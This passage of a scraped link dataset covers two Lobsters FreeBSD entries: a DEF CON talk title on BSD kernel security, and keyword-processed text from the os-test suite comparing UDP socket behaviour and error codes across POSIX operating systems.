426,Lobsters,freebsd,FreeBSD,Ilja van Sprundel - Are all BSDs are created equally?,https://www.youtube.com/watch?v=1j1UaLsPv3k,ilja van sprundel bsds created equally,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature def con ilja van sprundel bsds created equally survey bsd kerne youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature def con ilja van sprundel bsds created equally survey bsd kerne youtube
427,Lobsters,freebsd,FreeBSD,os-test,https://sortix.org/os-test/,ostest,accept acceptnonblock bindconflictanyany bindconflictanyanysoreuseaddr bindconflictanyanysoreuseaddrboth bindconflictanybroadcast bindconflictanybroadcastsoreuseaddr bindconflictanybroadcastsoreuseaddrboth bindconflictanyloopback bindconflictanyloopbacksoreuseaddr bindconflictanyloopbacksoreuseaddrboth bindconflictbroadcastany bindconflictbroadcastanysoreuseaddr bindconflictbroadcastanysoreuseaddrboth bindconflictbroadcastbroadcast bindconflictbroadcastbroadcastsoreuseaddr bindconflictbroadcastbroadcastsoreuseaddrboth bindconflictbroadcastloopback bindconflictbroadcastloopbacksoreuseaddr bindconflictbroadcastloopbacksoreuseaddrboth bindconflictloopbackany bindconflictloopbackanysoreuseaddr bindconflictloopbackanysoreuseaddrboth bindconflictloopbackbroadcast bindconflictloopbackbroadcastsoreuseaddr bindconflictloopbackbroadcastsoreuseaddrboth bindconflictloopbackloopback bindconflictloopbackloopbacksoreuseaddr bindconflictloopbackloopbacksoreuseaddrboth bindconnectself bindconnectselfsend bindconnectselfsendpoll bindconnectselfsendrecv bindconnectselfsendshutdownrpoll bindconnectselfsendshutdownrrecv bindconnectselfsendshutdownrrecvrecv bindconnectselfsendshutdownrwpoll bindconnectselfsendshutdownrwrecv bindconnectselfsendshutdownrwrecvrecv bindconnectselfshutdownrsendpoll bindconnectselfshutdownrsendrecv bindlansubnetbroadcast bindlansubnetfirst bindlansubnetwrong bindloopbackbroadcast bindloopbackother bindrebind bindsendtoself bindsendtoselfrecv bindsocketsendtofirstpoll bindsocketsendtofirstrecv bindsocketsendtofirstshutdownrpoll bindsocketsendtofirstshutdownrrecv bindsocketsendtofirstshutdownrwpoll bindsocketsendtofirstshutdownrwrecv bindsocketsendtofirstshutdownwpoll bindsocketsendtofirstshutdownwrecv bindsocketshutdownrsendtofirstpoll bindsocketshutdownrsendtofirstrecv bindsocketshutdownrwsendtofirstpoll bindsocketshutdownrwsendtofirstrecv bindsocketshutdownwsendtofirstpoll bindsocketshutdownwsendtofirstrecv connectanygetpeername connectanygetsockname connectbroadcastgetpeername connectbroadcastgetpeernamesobroadcast connectbroadcastgetsockname connectbroadcastgetsocknamesobroadcast connectgetpeername connectloopbackgetsobindtodevice connectloopbackgetpeername connectloopbackgetsockname connectloopbackreconnectloopbackgetsockname connectloopbackreconnectwangetsockname connectloopbackunconnectrebindanygetsockname connectloopbackunconnectrebindloopbackgetsockname connectpoll connectreconnect connectreconnectanygetpeername connectreconnectgetpeername connectreconnectsame connectrecv connectsenderroraccept connectsenderrorgetpeername connectsenderrorgetsockname connectsenderrorlisten connectsenderrorpoll connectsenderrorpollpoll connectsenderrorpollsoerrorpoll connectsenderrorreconnect connectsenderrorrecv connectsenderrorsend connectsenderrorsendsend connectsenderrorshutdownrrecv connectsenderrorshutdownrsend connectsenderrorshutdownrwrecv connectsenderrorshutdownrwsend connectsenderrorshutdownrwsoerror connectsenderrorshutdownwrecv connectsenderrorshutdownwsend connectsenderrorsoerrorsendsend connectsendtonull connectsendtoother connectsendtosame connectshutdown connectshutdownrrecv connectshutdownrsend connectshutdownrunconnectrecv connectshutdownrunconnectsend connectshutdownreconnect connectshutdownrwreconnectsend connectshutdownrwrecv connectshutdownrwsend connectshutdownrwunconnectrecv connectshutdownrwunconnectsend connectshutdownwrecv connectshutdownwsend connectshutdownwunconnectrecv connectshutdownwunconnectsend connectunconnect connectunconnectgetpeername connectunconnectgetsockname connectunconnectsafamily connectunconnectshutdownrrecv connectunconnectshutdownrsend connectunconnectshutdownrwrecv connectunconnectshutdownrwsend connectunconnectshutdownwrecv connectunconnectshutdownwsend connectunconnectsockaddr connectunconnectsockaddrin connectunconnectsockaddrstorage connectunconnectunconnect connectwangetsobindtodevice connectwangetsockname connectwansendreconnectloopbacksend connectwanunconnectrebindanygetsockname connectwanunconnectrebindsamegetsockname crossnetiflansendloopbackrecv crossnetifloopbacksendlanrecv getsobindtodevice getpeername getsockname listen pairpoll pairsendpoll pairsendrecv pairsendshutdownrpoll pairsendshutdownrrecv pairsendshutdownrwpoll pairsendshutdownrwrecv pairsendshutdownwpoll pairsendshutdownwrecv pairshutdownrpoll pairshutdownrsendpoll pairshutdownrsendrecv pairshutdownrwpoll pairshutdownrwsendpoll pairshutdownrwsendrecv pairshutdownwpoll pairshutdownwsendpoll pairshutdownwsendrecv poll recvfromgetsockname send sendtoanysoerror sendtogetsockname sendtonull shutdown shutdownrrecv shutdownrsend shutdownrwrecv shutdownrwsend shutdownwrecv shutdownwsend soerror trioconnectsendrightxpoll trioconnectsendrightxrecv trioconnectsendwrongypoll trioconnectsendwrongyrecv trioconnectsendwrongysendrightxpoll trioconnectsendwrongysendrightxrecv triosendrightxpoll triosendrightxrecv triosendrightxsendwrongypoll triosendrightxsendwrongyrecv triosendwrongyconnectpoll triosendwrongyconnectrecv triosendwrongyconnectsendrightxpoll triosendwrongyconnectsendrightxrecv unconnect unconnectgetpeername unconnectgetsockname,ostest set test suite posix operating system designed make easy compare difference operating system find operating system bug consists test suite focus different operating system area page visualizes result free software posix operating system relevant today run ostest host linux system rest system run virtualbox virtual machine every system testing harness connects virtual machine ssh run test system suite test inputoutput system call suite test memory allocation suite test udp stack dragonflydragonfly freebsdfreebsd haikuhaiku hurdgnu linuxlinux macosdarwin minixminix netbsdnetbsd openbsdopenbsd openindianaomniossunos sortixsortix accept dragonfly badaccept einval freebsd badaccept einval haiku badaccept einval hurd goodaccept enotsup linux goodaccept enotsup macos goodaccept enotsup minix goodaccept enotsup netbsd goodaccept enotsup openbsd badaccept einval openindianaomnios goodaccept enotsup sortix goodaccept enotsup acceptnonblock dragonfly badaccept einval freebsd badaccept einval haiku badaccept einval hurd goodaccept enotsup linux goodaccept enotsup macos goodaccept enotsup minix goodaccept enotsup netbsd goodaccept enotsup openbsd badaccept einval openindianaomnios goodaccept enotsup sortix goodaccept enotsup dragonfly goodexit freebsd goodexit haiku goodexit hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit dragonfly goodgetsockname enotconn freebsd goodgetsockname enotconn haiku goodgetsockname enotconn hurd goodgetsockname enotconn linux goodgetsockname enotconn macos goodgetsockname enotconn minix goodgetsockname enotconn netbsd goodgetsockname enotconn openbsd goodgetsockname enotconn openindianaomnios goodgetsockname enotconn sortix goodgetsockname enotconn dragonfly nonzero freebsd nonzero haiku nonzero hurd nonzero linux nonzero macos nonzero minix nonzero netbsd nonzero openbsd nonzero openindianaomnios nonzero sortix nonzero dragonfly goodbind afunspec einval freebsd goodbind afunspec einval haiku goodbind afunspec eafnosupport hurd goodbind afunspec einval linux goodbind afunspec einval macos goodbind afunspec einval minix goodbind afunspec einval netbsd goodbind afunspec einval openbsd goodbind afunspec einval openindianaomnios goodbind afunspec einval sortix goodbind afunspec einval dragonfly unknownbind eaddrnotavail freebsd unknownbind eaddrnotavail haiku badbind general system error hurd unknowngetpeername enotconn linux unknowngetpeername enotconn macos unknownbind eaddrnotavail minix unknownbind eaddrnotavail netbsd unknownbind eaddrnotavail openbsd unknowngetpeername enotconn openindianaomnios unknowngetpeername enotconn sortix unknowngetpeername enotconn dragonfly unknownbind eaddrnotavail freebsd unknownbind eaddrnotavail haiku badbind general system error hurd nonzero linux nonzero macos unknownbind eaddrnotavail minix unknownbind eaddrnotavail netbsd unknownbind eaddrnotavail openbsd nonzero openindianaomnios nonzero sortix nonzero bindconflictanyany dragonfly goodsecond bind eaddrinuse freebsd goodsecond bind eaddrinuse haiku goodsecond bind eaddrinuse hurd goodsecond bind eaddrinuse linux goodsecond bind eaddrinuse macos goodsecond bind eaddrinuse minix goodsecond bind eaddrinuse netbsd goodsecond bind eaddrinuse openbsd goodsecond bind eaddrinuse openindianaomnios goodsecond bind eaddrinuse sortix goodsecond bind eaddrinuse bindconflictanyanysoreuseaddr dragonfly unknownsecond bind eaddrinuse freebsd unknownsecond bind eaddrinuse haiku unknownsecond bind eaddrinuse hurd unknownsecond bind eaddrinuse linux unknownsecond bind eaddrinuse macos unknownsecond bind eaddrinuse minix unknownsecond bind eaddrinuse netbsd unknownsecond bind eaddrinuse openbsd unknownsecond bind eaddrinuse openindianaomnios unknownexit sortix unknownsecond bind eaddrinuse bindconflictanyanysoreuseaddrboth dragonfly unknownsecond bind eaddrinuse freebsd unknownsecond bind eaddrinuse haiku unknownsecond bind eaddrinuse hurd unknownexit linux unknownexit macos unknownsecond bind eaddrinuse minix unknownexit netbsd unknownsecond bind eaddrinuse openbsd unknownsecond bind eaddrinuse openindianaomnios unknownexit sortix unknownsecond bind eaddrinuse bindconflictanybroadcast dragonfly unknownsecond bind eaddrnotavail freebsd unknownsecond bind eaddrnotavail haiku unknownsecond bind eaddrinuse hurd unknownsecond bind eaddrinuse linux unknownsecond bind eaddrinuse macos unknownsecond bind eaddrnotavail minix unknownsecond bind eaddrnotavail netbsd unknownsecond bind eaddrnotavail openbsd unknownsecond bind eaddrinuse openindianaomnios unknownsecond bind eaddrinuse sortix unknownsecond bind eaddrinuse bindconflictanybroadcastsoreuseaddr dragonfly unknownsecond bind eaddrnotavail freebsd unknownsecond bind eaddrnotavail haiku unknownsecond bind eaddrinuse hurd unknownsecond bind eaddrinuse linux unknownsecond bind eaddrinuse macos unknownsecond bind eaddrnotavail minix unknownsecond bind eaddrnotavail netbsd unknownsecond bind eaddrnotavail openbsd unknownexit openindianaomnios unknownexit sortix unknownsecond bind eaddrinuse bindconflictanybroadcastsoreuseaddrboth dragonfly unknownsecond bind eaddrnotavail freebsd unknownsecond bind eaddrnotavail haiku badsecond bind general system error hurd unknownexit linux unknownexit macos unknownsecond bind eaddrnotavail minix unknownsecond bind eaddrnotavail netbsd unknownsecond bind eaddrnotavail openbsd unknownexit openindianaomnios unknownexit sortix unknownexit bindconflictanyloopback dragonfly goodsecond bind eaddrinuse freebsd goodsecond bind eaddrinuse haiku goodsecond bind eaddrinuse hurd goodsecond bind eaddrinuse linux goodsecond bind eaddrinuse macos goodsecond bind eaddrinuse minix badexit netbsd goodsecond bind eaddrinuse openbsd goodsecond bind eaddrinuse openindianaomnios goodsecond bind eaddrinuse sortix goodsecond bind eaddrinuse bindconflictanyloopbacksoreuseaddr dragonfly unknownexit freebsd unknownexit haiku unknownsecond bind eaddrinuse hurd unknownsecond bind eaddrinuse linux unknownsecond bind eaddrinuse macos unknownexit minix unknownexit netbsd unknownexit openbsd unknownexit openindianaomnios unknownexit sortix unknownsecond bind eaddrinuse bindconflictanyloopbacksoreuseaddrboth dragonfly goodexit freebsd goodexit haiku goodexit hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit bindconflictbroadcastany dragonfly unknownfirst bind eaddrnotavail freebsd unknownfirst bind eaddrnotavail haiku badfirst bind general system error hurd unknownsecond bind eaddrinuse linux unknownsecond bind eaddrinuse macos unknownfirst bind eaddrnotavail minix unknownfirst bind eaddrnotavail netbsd unknownfirst bind eaddrnotavail openbsd unknownsecond bind eaddrinuse openindianaomnios unknownsecond bind eaddrinuse sortix unknownsecond bind eaddrinuse bindconflictbroadcastanysoreuseaddr dragonfly unknownfirst bind eaddrnotavail freebsd unknownfirst bind eaddrnotavail haiku badfirst bind general system error hurd unknownsecond bind eaddrinuse linux unknownsecond bind eaddrinuse macos unknownfirst bind eaddrnotavail minix unknownfirst bind eaddrnotavail netbsd unknownfirst bind eaddrnotavail openbsd unknownexit openindianaomnios unknownexit sortix unknownsecond bind eaddrinuse bindconflictbroadcastanysoreuseaddrboth dragonfly unknownfirst bind eaddrnotavail freebsd unknownfirst bind eaddrnotavail haiku badfirst bind general system error hurd unknownexit linux unknownexit macos unknownfirst bind eaddrnotavail minix unknownfirst bind eaddrnotavail netbsd unknownfirst bind eaddrnotavail openbsd unknownexit openindianaomnios unknownexit sortix unknownexit bindconflictbroadcastbroadcast dragonfly unknownfirst bind eaddrnotavail freebsd unknownfirst bind eaddrnotavail haiku badfirst bind general system error hurd unknownsecond bind eaddrinuse linux unknownsecond bind eaddrinuse macos unknownfirst bind eaddrnotavail minix unknownfirst bind eaddrnotavail netbsd unknownfirst bind eaddrnotavail openbsd unknownsecond bind eaddrinuse openindianaomnios unknownsecond bind eaddrinuse sortix unknownsecond bind eaddrinuse bindconflictbroadcastbroadcastsoreuseaddr dragonfly unknownfirst bind eaddrnotavail freebsd unknownfirst bind eaddrnotavail haiku badfirst bind general system error hurd unknownsecond bind eaddrinuse linux unknownsecond bind eaddrinuse macos unknownfirst bind eaddrnotavail minix unknownfirst bind eaddrnotavail netbsd unknownfirst bind eaddrnotavail openbsd unknownsecond bind eaddrinuse openindianaomnios unknownexit sortix unknownsecond bind eaddrinuse bindconflictbroadcastbroadcastsoreuseaddrboth dragonfly unknownfirst bind eaddrnotavail freebsd unknownfirst bind eaddrnotavail haiku badfirst bind general system error hurd unknownexit linux unknownexit macos unknownfirst bind eaddrnotavail minix unknownfirst bind eaddrnotavail netbsd unknownfirst bind eaddrnotavail openbsd unknownsecond bind eaddrinuse openindianaomnios unknownexit sortix unknownsecond bind eaddrinuse bindconflictbroadcastloopback dragonfly unknownfirst bind eaddrnotavail freebsd unknownfirst bind eaddrnotavail haiku badfirst bind general system error hurd unknownexit linux unknownexit macos unknownfirst bind eaddrnotavail minix unknownfirst bind eaddrnotavail netbsd unknownfirst bind eaddrnotavail openbsd unknownexit openindianaomnios unknownexit sortix unknownexit bindconflictbroadcastloopbacksoreuseaddr dragonfly unknownfirst bind eaddrnotavail freebsd unknownfirst bind eaddrnotavail haiku badfirst bind general system error hurd unknownexit linux unknownexit macos unknownfirst bind eaddrnotavail minix unknownfirst bind eaddrnotavail netbsd unknownfirst bind eaddrnotavail openbsd unknownexit openindianaomnios unknownexit sortix unknownexit bindconflictbroadcastloopbacksoreuseaddrboth dragonfly unknownfirst bind eaddrnotavail freebsd unknownfirst bind eaddrnotavail haiku badfirst bind general system error hurd unknownexit linux unknownexit macos unknownfirst bind eaddrnotavail minix unknownfirst bind eaddrnotavail netbsd unknownfirst bind eaddrnotavail openbsd unknownexit openindianaomnios unknownexit sortix unknownexit bindconflictloopbackany dragonfly goodsecond bind eaddrinuse freebsd goodsecond bind eaddrinuse haiku goodsecond bind eaddrinuse hurd goodsecond bind eaddrinuse linux goodsecond bind eaddrinuse macos goodsecond bind eaddrinuse minix badexit netbsd goodsecond bind eaddrinuse openbsd goodsecond bind eaddrinuse openindianaomnios goodsecond bind eaddrinuse sortix goodsecond bind eaddrinuse bindconflictloopbackanysoreuseaddr dragonfly unknownexit freebsd unknownexit haiku unknownsecond bind eaddrinuse hurd unknownsecond bind eaddrinuse linux unknownsecond bind eaddrinuse macos unknownexit minix unknownexit netbsd unknownexit openbsd unknownexit openindianaomnios unknownexit sortix unknownsecond bind eaddrinuse bindconflictloopbackanysoreuseaddrboth dragonfly goodexit freebsd goodexit haiku goodexit hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit bindconflictloopbackbroadcast dragonfly unknownsecond bind eaddrnotavail freebsd unknownsecond bind eaddrnotavail haiku badsecond bind eaddrinuse hurd unknownexit linux unknownexit macos unknownsecond bind eaddrnotavail minix unknownsecond bind eaddrnotavail netbsd unknownsecond bind eaddrnotavail openbsd unknownexit openindianaomnios unknownexit sortix unknownexit bindconflictloopbackbroadcastsoreuseaddr dragonfly unknownsecond bind eaddrnotavail freebsd unknownsecond bind eaddrnotavail haiku badsecond bind eaddrinuse hurd unknownexit linux unknownexit macos unknownsecond bind eaddrnotavail minix unknownsecond bind eaddrnotavail netbsd unknownsecond bind eaddrnotavail openbsd unknownexit openindianaomnios unknownexit sortix unknownexit bindconflictloopbackbroadcastsoreuseaddrboth dragonfly unknownsecond bind eaddrnotavail freebsd unknownsecond bind eaddrnotavail haiku badsecond bind general system error hurd unknownexit linux unknownexit macos unknownsecond bind eaddrnotavail minix unknownsecond bind eaddrnotavail netbsd unknownsecond bind eaddrnotavail openbsd unknownexit openindianaomnios unknownexit sortix unknownexit bindconflictloopbackloopback dragonfly goodsecond bind eaddrinuse freebsd goodsecond bind eaddrinuse haiku goodsecond bind eaddrinuse hurd goodsecond bind eaddrinuse linux goodsecond bind eaddrinuse macos goodsecond bind eaddrinuse minix goodsecond bind eaddrinuse netbsd goodsecond bind eaddrinuse openbsd goodsecond bind eaddrinuse openindianaomnios goodsecond bind eaddrinuse sortix goodsecond bind eaddrinuse bindconflictloopbackloopbacksoreuseaddr dragonfly unknownsecond bind eaddrinuse freebsd unknownsecond bind eaddrinuse haiku unknownsecond bind eaddrinuse hurd unknownsecond bind eaddrinuse linux unknownsecond bind eaddrinuse macos unknownsecond bind eaddrinuse minix unknownsecond bind eaddrinuse netbsd unknownsecond bind eaddrinuse openbsd unknownsecond bind eaddrinuse openindianaomnios unknownexit sortix unknownsecond bind eaddrinuse bindconflictloopbackloopbacksoreuseaddrboth dragonfly unknownsecond bind eaddrinuse freebsd unknownsecond bind eaddrinuse haiku unknownsecond bind eaddrinuse hurd unknownexit linux unknownexit macos unknownsecond bind eaddrinuse minix unknownexit netbsd unknownsecond bind eaddrinuse openbsd unknownsecond bind eaddrinuse openindianaomnios unknownexit sortix unknownsecond bind eaddrinuse bindconnectself dragonfly goodexit freebsd goodexit haiku goodexit hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit bindconnectselfsend dragonfly goodexit freebsd goodexit haiku goodexit hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit bindconnectselfsendpoll dragonfly pollin pollout freebsd pollin pollout haiku pollin pollout hurd pollin pollout linux pollin pollout macos pollin pollout minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollout bindconnectselfsendrecv dragonfly goodx freebsd goodx haiku goodx hurd goodx linux goodx macos goodx minix goodx netbsd goodx openbsd goodx openindianaomnios goodx sortix goodx bindconnectselfsendshutdownrpoll dragonfly pollin pollout freebsd pollin pollout haiku badshutdown enotsup hurd pollin pollout linux pollin pollout macos pollin pollhup minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollout bindconnectselfsendshutdownrrecv dragonfly unknowneof freebsd unknowneof haiku badshutdown enotsup hurd unknownx linux unknownx macos unknowneof minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknowneof sortix unknowneof bindconnectselfsendshutdownrrecvrecv dragonfly unknownfirst recv eof freebsd unknownfirst recv eof haiku badshutdown enotsup hurd badfirst recv xsecond recv einval linux unknownfirst recv xsecond recv ewouldblock macos unknownfirst recv eof minix unknownfirst recv eof netbsd unknownfirst recv eof openbsd unknownfirst recv eof openindianaomnios unknownfirst recv eof sortix unknownfirst recv eof bindconnectselfsendshutdownrwpoll dragonfly pollin pollhup freebsd pollin pollhup haiku badshutdown enotsup hurd pollin linux pollin pollout pollhup macos pollin pollhup minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollhup bindconnectselfsendshutdownrwrecv dragonfly unknowneof freebsd unknowneof haiku badshutdown enotsup hurd unknownx linux unknownx macos unknowneof minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknowneof sortix unknowneof bindconnectselfsendshutdownrwrecvrecv dragonfly unknownfirst recv eof freebsd unknownfirst recv eof haiku badshutdown enotsup hurd badfirst recv xsecond recv einval linux unknownfirst recv xsecond recv ewouldblock macos unknownfirst recv eof minix unknownfirst recv eof netbsd unknownfirst recv eof openbsd unknownfirst recv eof openindianaomnios unknownfirst recv eof sortix unknownfirst recv eof bindconnectselfshutdownrsendpoll dragonfly pollin pollout freebsd pollin pollout haiku badshutdown enotsup hurd pollin pollout linux pollin pollout macos pollin pollhup minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollout bindconnectselfshutdownrsendrecv dragonfly unknowneof freebsd unknowneof haiku badshutdown enotsup hurd badx linux badx macos unknowneof minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknowneof sortix unknowneof bindlansubnetbroadcast dragonfly goodexit freebsd goodexit haiku goodexit hurd goodexit linux goodexit macos goodexit minix badbind eaddrnotavail netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit bindlansubnetfirst dragonfly unknownbind eaddrnotavail freebsd unknownbind eaddrnotavail haiku badbind general system error hurd unknownexit linux unknownexit macos unknownbind eaddrnotavail minix unknownbind eaddrnotavail netbsd unknownbind eaddrnotavail openbsd unknownbind eaddrnotavail openindianaomnios unknownexit sortix unknownbind eaddrnotavail bindlansubnetwrong dragonfly goodbind eaddrnotavail freebsd goodbind eaddrnotavail haiku badbind general system error hurd goodbind eaddrnotavail linux goodbind eaddrnotavail macos goodbind eaddrnotavail minix goodbind eaddrnotavail netbsd goodbind eaddrnotavail openbsd goodbind eaddrnotavail openindianaomnios goodbind eaddrnotavail sortix goodbind eaddrnotavail dragonfly goodgetsockname enotconn freebsd goodgetsockname enotconn haiku goodgetsockname enotconn hurd goodgetsockname enotconn linux goodgetsockname enotconn macos goodgetsockname enotconn minix goodgetsockname enotconn netbsd goodgetsockname enotconn openbsd goodgetsockname enotconn openindianaomnios goodgetsockname enotconn sortix goodgetsockname enotconn dragonfly nonzero freebsd nonzero haiku nonzero hurd nonzero linux nonzero macos nonzero minix nonzero netbsd nonzero openbsd nonzero openindianaomnios nonzero sortix nonzero bindloopbackbroadcast dragonfly unknownbind eaddrnotavail freebsd unknownbind eaddrnotavail haiku badbind general system error hurd unknownexit linux unknownexit macos unknownbind eaddrnotavail minix unknownbind eaddrnotavail netbsd unknownbind eaddrnotavail openbsd unknownbind eaddrnotavail openindianaomnios unknownbind eaddrnotavail sortix unknownexit bindloopbackother dragonfly unknownbind eaddrnotavail freebsd unknownbind eaddrnotavail haiku badbind general system error hurd unknownexit linux unknownexit macos unknownbind eaddrnotavail minix unknownbind eaddrnotavail netbsd unknownbind eaddrnotavail openbsd unknownbind eaddrnotavail openindianaomnios unknownbind eaddrnotavail sortix unknownbind eaddrnotavail bindrebind dragonfly goodsecond bind einval freebsd goodsecond bind einval haiku badexit hurd goodsecond bind einval linux goodsecond bind einval macos goodsecond bind einval minix goodsecond bind einval netbsd goodsecond bind einval openbsd goodsecond bind einval openindianaomnios goodsecond bind einval sortix goodsecond bind einval bindsendtoself dragonfly goodexit freebsd goodexit haiku goodexit hurd goodexit linux goodexit macos goodexit minix goodexit netbsd goodexit openbsd goodexit openindianaomnios goodexit sortix goodexit bindsendtoselfrecv dragonfly goodx freebsd goodx haiku goodx hurd goodx linux goodx macos goodx minix goodx netbsd goodx openbsd goodx openindianaomnios goodx sortix goodx bindsocketsendtofirstpoll dragonfly pollin pollout freebsd pollin pollout haiku pollin pollout hurd pollin pollout linux pollin pollout macos pollin pollout minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios pollin pollout sortix pollin pollout bindsocketsendtofirstrecv dragonfly goodx freebsd goodx haiku goodx hurd goodx linux goodx macos goodx minix goodx netbsd goodx openbsd goodx openindianaomnios goodx sortix goodx bindsocketsendtofirstshutdownrpoll dragonfly pollin pollout freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios unknownshutdown enotconn sortix pollin pollout bindsocketsendtofirstshutdownrrecv dragonfly unknowneof freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknownshutdown enotconn sortix unknowneof bindsocketsendtofirstshutdownrwpoll dragonfly pollin pollhup freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios unknownshutdown enotconn sortix pollin pollhup bindsocketsendtofirstshutdownrwrecv dragonfly unknowneof freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknownshutdown enotconn sortix unknowneof bindsocketsendtofirstshutdownwpoll dragonfly pollin pollhup freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios unknownshutdown enotconn sortix pollin pollhup bindsocketsendtofirstshutdownwrecv dragonfly unknownx freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix unknownx netbsd unknownx openbsd unknownx openindianaomnios unknownshutdown enotconn sortix unknownx bindsocketshutdownrsendtofirstpoll dragonfly pollin pollout freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios unknownshutdown enotconn sortix pollin pollout bindsocketshutdownrsendtofirstrecv dragonfly unknowneof freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknownshutdown enotconn sortix unknowneof bindsocketshutdownrwsendtofirstpoll dragonfly pollin pollhup freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios unknownshutdown enotconn sortix pollin pollhup bindsocketshutdownrwsendtofirstrecv dragonfly unknowneof freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix unknowneof netbsd unknowneof openbsd unknowneof openindianaomnios unknownshutdown enotconn sortix unknowneof bindsocketshutdownwsendtofirstpoll dragonfly pollin pollhup freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix pollin pollout netbsd pollin pollout openbsd pollin pollout openindianaomnios unknownshutdown enotconn sortix pollin pollhup bindsocketshutdownwsendtofirstrecv dragonfly unknownx freebsd unknownshutdown enotconn haiku badshutdown enotsup hurd unknownshutdown enotconn linux unknownshutdown enotconn macos unknownshutdown enotconn minix unknownx netbsd unknownx openbsd unknownx openindianaomnios unknownshutdown enotconn sortix unknownx dragonfly unknowngetpeername enotconn freebsd unknownconnect eaddrnotavail haiku hurd linux unknowngetpeername enotconn macos unknownconnect eaddrnotavail minix unknownconnect ehostunreach netbsd unknownconnect eaddrnotavail openbsd unknownconnect eaddrnotavail openindianaomnios unknownconnect eaddrnotavail sortix unknownconnect eaddrnotavail dragonfly nonzero freebsd unknownconnect eaddrnotavail haiku nonzero hurd nonzero linux nonzero macos unknownconnect eaddrnotavail minix unknownconnect ehostunreach netbsd unknownconnect eaddrnotavail openbsd unknownconnect eaddrnotavail openindianaomnios unknownconnect eaddrnotavail sortix unknownconnect eaddrnotavail connectanygetpeername dragonfly freebsd haiku hurd linux macos minix unknownconnect ehostunreach netbsd openbsd openindianaomnios sortix unknownconnect enetunreach connectanygetsockname dragonfly nonzero freebsd nonzero haiku nonzero hurd nonzero linux nonzero macos nonzero minix unknownconnect ehostunreach netbsd nonzero openbsd nonzero openindianaomnios nonzero sortix unknownconnect enetunreach connectbroadcastgetpeername dragonfly freebsd haiku hurd goodconnect eacces linux goodconnect eacces macos minix netbsd openbsd openindianaomnios sortix connectbroadcastgetpeernamesobroadcast dragonfly freebsd haiku hurd linux macos minix netbsd openbsd openindianaomnios sortix connectbroadcastgetsockname dragonfly nonzero freebsd nonzero haiku nonzero hurd goodconnect eacces linux goodconnect eacces macos nonzero minix nonzero netbsd nonzero openbsd nonzero openindianaomnios nonzero sortix nonzero connectbroadcastgetsocknamesobroadcast dragonfly nonzero freebsd nonzero haiku nonzero hurd nonzero linux nonzero macos nonzero minix nonzero netbsd nonzero openbsd nonzero openindianaomnios nonzero sortix nonzero connectgetpeername dragonfly freebsd haiku hurd linux macos minix netbsd openbsd openindianaomnios sortix dragonfly unknowngetpeername enotconn freebsd unknownconnect eaddrnotavail haiku hurd linux unknowngetpeername enotconn macos unknownconnect eaddrnotavail minix unknownconnect eaddrnotavail netbsd unknownconnect eaddrnotavail openbsd unknownconnect eaddrnotavail openindianaomnios unknownconnect eaddrnotavail sortix unknownconnect eaddrnotavail dragonfly nonzero freebsd unknownconnect eaddrnotavail haiku nonzero hurd nonzero linux nonzero macos unknownconnect eaddrnotavail minix unknownconnect eaddrnotavail netbsd unknownconnect eaddrnotavail openbsd unknownconnect eaddrnotavail openindianaomnios unknownconnect eaddrnotavail sortix unknownconnect eaddrnotavail connectloopbackgetsobindtodevice dragonfly goodgetsockopt sobindtodevice enosys freebsd goodgetsockopt sobindtodevice enosys haiku goodgetsockopt sobindtodevice enoprotoopt hurd goodgetsockopt 